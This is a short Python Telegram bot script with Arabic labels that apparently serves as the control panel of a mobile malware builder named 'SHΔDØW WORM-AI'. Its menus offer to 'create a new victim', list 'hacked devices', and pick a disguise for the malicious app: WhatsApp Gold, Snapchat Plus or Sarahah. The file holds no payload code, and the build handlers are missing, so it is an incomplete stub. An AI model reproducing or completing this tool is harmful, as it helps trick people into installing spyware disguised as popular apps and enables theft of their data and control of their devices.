import os
import telebot
from telebot import types
from flask import Flask

# جلب التوكن من إعدادات السيرفر
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# الواجهة الرئيسية
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item1 = types.InlineKeyboardButton("🛠️ إنشاء ضحية جديدة", callback_data='create_victim')
    item2 = types.InlineKeyboardButton("📱 الأجهزة المخترقة", callback_data='list_victims')
    markup.add(item1, item2)
    
    bot.send_message(
        message.chat.id, 
        "💀 **SHΔDØW WORM-AI**\n\nمرحباً بك في لوحة التحكم. اختر أحد الخيارات أدناه:", 
        reply_markup=markup, 
        parse_mode='Markdown'
    )

# منطق الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data == "create_victim":
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("🟡 واتساب الذهبي", callback_data='build_wa')
        btn2 = types.InlineKeyboardButton("👻 سناب شات بلس", callback_data='build_snap')
        btn3 = types.InlineKeyboardButton("💬 صارحني", callback_data='build_sarahni')
        btn4 = types.InlineKeyboardButton("🔙 رجوع", callback_data='back_home')
        markup.add(btn1, btn2, btn3, btn4)
        bot.edit_message_text("اختر نوع التمويه لصناعة التطبيق:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "back_home":
        start(call.message)

# تشغيل سيرفر وهمي ليبقي الخدمة تعمل على Render
@app.route('/')
def index(): return "Server is running!"

if __name__ == "__main__":
    # تشغيل البوت
    bot.infinity_polling()
